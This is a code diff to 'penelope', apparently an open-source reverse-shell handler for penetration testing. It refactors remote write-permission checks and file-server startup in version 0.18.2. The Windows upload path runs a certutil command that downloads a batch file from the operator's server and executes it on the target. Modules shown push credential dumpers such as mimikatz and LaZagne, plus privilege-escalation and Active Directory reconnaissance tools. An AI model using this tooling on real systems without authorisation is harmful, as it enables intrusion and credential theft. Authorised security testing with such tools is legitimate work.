@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.18.1"
+__version__ = "0.18.2"
 
 import os
 import io
@@ -1495,7 +1495,6 @@ class MainMenu(BetterCMD):
 	def complete_download(self, text, line, begidx, endidx):
 		if not self.sid:
 			return []
-
 		try:
 			session = core.sessions[self.sid]
 		except KeyError:
@@ -2311,6 +2310,39 @@ class Session:
 
 		return response or ''
 
+	def write_access(self, directory):
+		try:
+			if self.OS == 'Unix':
+				if self.agent:
+					if not eval(self.exec(
+						f"stdout_stream << str(os.access(normalize_path('{directory}'), os.W_OK)).encode()",
+						python=True,
+						value=True
+					)):
+						logger.error(f"{directory}: Permission denied")
+						return False
+				else:
+					if directory.startswith('~'):
+						directory = self.exec(f"echo {directory}", value=True)
+					if int(self.exec(f"[ -w \"{directory}\" ];echo $?", value=True)):
+						logger.error(f"{directory}: Permission denied")
+						return False
+
+			elif self.OS == 'Windows':
+				write_test_file = rand(16)
+				cmd = 'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'
+				response = self.exec(cmd, force_cmd=True, value=True)
+				if response == "NO":
+					logger.error(f"{directory}: Access is denied.")
+					return False
+
+		except Exception as e:
+			logger.error(e)
+			logger.warning("Cannot check remote permissions. Aborting...")
+			return None
+
+		return True
+
 	def get_remote_completion(self, text):
 		"""
 		Obtain file and directory completions from the remote shell.
@@ -2319,41 +2351,37 @@ class Session:
 
 		try:
 			if self.agent:
-							safe_text = text.replace("'", "\\'")
-							code = (
-								f"import glob, os; "
-								f"matches = glob.glob('{safe_text}*'); "
-								f"result = '\\n'.join([p + '/' if os.path.isdir(p) else p for p in matches]); "
-								f"stdout_stream << result.encode()"
-							)
-							result = self.exec(code, python=True, value=True, timeout=True)
-							if result:
-								return result.splitlines()
+				safe_text = text.replace("'", "\\'")
+				code = (
+					f"import glob, os; "
+					f"matches = glob.glob('{safe_text}*'); "
+					f"result = '\\n'.join([p + '/' if os.path.isdir(p) else p for p in matches]); "
+					f"stdout_stream << result.encode()"
+				)
+				result = self.exec(code, python=True, value=True)
+				if result:
+					return result.splitlines()
 
 			elif self.OS == 'Unix':
 				safe_pattern = shlex.quote(text) + "*"
-
 				cmd = f"ls -p -1 -d {safe_pattern} 2>/dev/null"
-				result = self.exec(cmd, value=True, timeout=True)
+				result = self.exec(cmd, value=True)
 				if result:
 					return result.splitlines()
 
 			elif self.OS == 'Windows':
 				win_text = text.replace('/', '\\')
 				cmd = f'dir /b "{win_text}*"'
-				
-				result = self.exec(cmd, force_cmd=True, value=True, timeout=True)
-				
+				result = self.exec(cmd, force_cmd=True, value=True)
+
 				if result:
 					if any(err in result for err in ["File Not Found", "The system cannot find", "Volume in drive"]):
 						return []
-					
 					return result.splitlines()
 		except Exception:
 			pass
 
 		return []
-
 
 	def get_tty(self, silent=False):
 		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
@@ -3463,31 +3491,11 @@ class Session:
 		return downloaded
 
 	def upload(self, local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None):
-		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
 
-		# Check remote permissions
+		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
 		destination = remote_path or self.cwd
-		try:
-			if self.OS == 'Unix':
-				if self.agent:
-					if not eval(self.exec(
-						f"stdout_stream << str(os.access(normalize_path('{destination}'), os.W_OK)).encode()",
-						python=True,
-						value=True
-					)):
-						logger.error(f"{destination}: Permission denied")
-						return []
-				else:
-					if destination.startswith('~'):
-						destination = self.exec(f"echo {destination}", value=True)
-					if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
-						logger.error(f"{destination}: Permission denied")
-						return []
-			elif self.OS == 'Windows':
-				pass # TODO
-		except Exception as e:
-			logger.error(e)
-			logger.warning("Cannot check remote permissions. Aborting...")
+
+		if not self.write_access(destination):
 			return []
 
 		# Initialization
@@ -3677,6 +3685,14 @@ class Session:
 					return [] # TODO
 
 		elif self.OS == 'Windows':
+
+			# Fire up File Server
+			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
+			server.start()
+			server.init.wait(options.short_timeout)
+			if not hasattr(server, 'id'):
+				return []
+
 			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
 			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
 			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
@@ -3706,7 +3722,6 @@ class Session:
 							myzip.write(item, arcname=altname)
 					altnames.append(altname)
 
-			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
 			urlpath_zip = server.add(tempfile_zip)
 
 			cwd_escaped = self.cwd.replace('\\', '\\\\')
@@ -3722,11 +3737,11 @@ class Session:
 
 			urlpath_bat = server.add(tempfile_bat)
 			temp_remote_file_bat = urlpath_bat.split("/")[-1]
-			server.start()
 			response = self.exec(
 				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
 				force_cmd=True, value=True, timeout=None)
 			server.stop()
+			server.term.wait(options.short_timeout)
 			if not response:
 				logger.error("Upload initialization failed...")
 				return []
@@ -4414,6 +4429,9 @@ class upload_privesc_scripts(Module):
 		"""
 		Upload {linpeas,lse,deepce,pspy|winpeas,powerup,privesccheck} to the target
 		"""
+		if not session.write_access(session.cwd):
+			return
+
 		if session.OS == 'Unix':
 			session.upload(URLS['linpeas'])
 			session.upload(URLS['lse'])
@@ -4551,6 +4569,9 @@ class upload_credump_scripts(Module):
 		"""
 		Upload mimikatz, LaZagne, Snaffler, SharpWeb to the Windows target
 		"""
+		if not session.write_access(session.cwd):
+			return
+
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
 
@@ -4575,6 +4596,9 @@ class upload_ad_scripts(Module):
 		"""
 		Upload Powerview, SharpHound, GhostPack collection to the Windows target
 		"""
+		if not session.write_access(session.cwd):
+			return
+
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
 
@@ -4824,6 +4848,8 @@ class FileServer:
 		self.items = items
 		self.url_prefix = url_prefix + '/' if url_prefix else ''
 		self.quiet = quiet
+		self.init = threading.Event()
+		self.term = threading.Event()
 		self.filemap = {}
 		for item in self.items:
 			self.add(item)
@@ -4971,12 +4997,14 @@ class FileServer:
 
 		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
 			if not self.httpd.server_bind(self.host, self.port):
+				self.init.set()
 				return False
 			self.httpd.server_activate()
 			self.id = core.new_fileserverID
 			core.fileservers[self.id] = self
 			if not quiet:
 				print(self.links)
+			self.init.set()
 			self.httpd.serve_forever()
 
 	def stop(self):
@@ -4984,6 +5012,7 @@ class FileServer:
 		if not self.quiet:
 			logger.warning(f"Shutting down Fileserver #{self.id}")
 		self.httpd.shutdown()
+		self.term.set()
 
 
 def WinResize(num, stack):
